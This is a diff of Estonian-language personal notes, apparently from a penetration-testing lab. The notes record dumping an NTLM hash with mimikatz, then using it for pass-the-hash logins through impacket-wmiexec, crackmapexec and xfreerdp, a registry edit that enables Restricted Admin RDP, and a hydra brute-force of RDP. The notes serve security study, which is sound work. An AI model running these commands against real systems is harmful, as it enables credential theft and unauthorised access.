@@ -1,3 +1,5 @@
+
+
 Linux pw reset:
 boot
 GRUB menüüs vajuta e
@@ -129,6 +131,10 @@ Käivitame mimikatzi (admin term)
   privilege::debug (tõstame õigusi, et saaks lugeda mälu)
   sekurlsa::logonpasswords
     NTLM: c625e3e2756d9ef01881fa7ed46b49a8
+/usr/bin/impacket-wmiexec -hashes :c625e3e2756d9ef01881fa7ed46b49a8 contoso/Administrator@192.168.1.2 (logime hashiga sisse)
+crackmapexec smb 192.168.1.2 -u "Administrator" -H "c625e3e2756d9ef01881fa7ed46b49a8" -x 'reg add HKLM\System\CurrentControlSet\LSA /t REG_WORD /v DisableRestrictedAdmin /d 0x0 /f' (Saadame sihtmärgile registri muudatuse, et lubada RDP)
+sudo xfreerdp3 /v:192.168.1.2 /u:Administrator /pth
 
 hydra -V -f -l Administrator -P /home/user/Documents/rockyou.txt rdp://192.168.1.2 (Proovime kräkida Administraator parooli)
-/usr/bin/impacket-wmiexec -hashes :c625e3e2756d9ef01881fa7ed46b49a8 contoso/Administrator@192.168.1.2
+
+
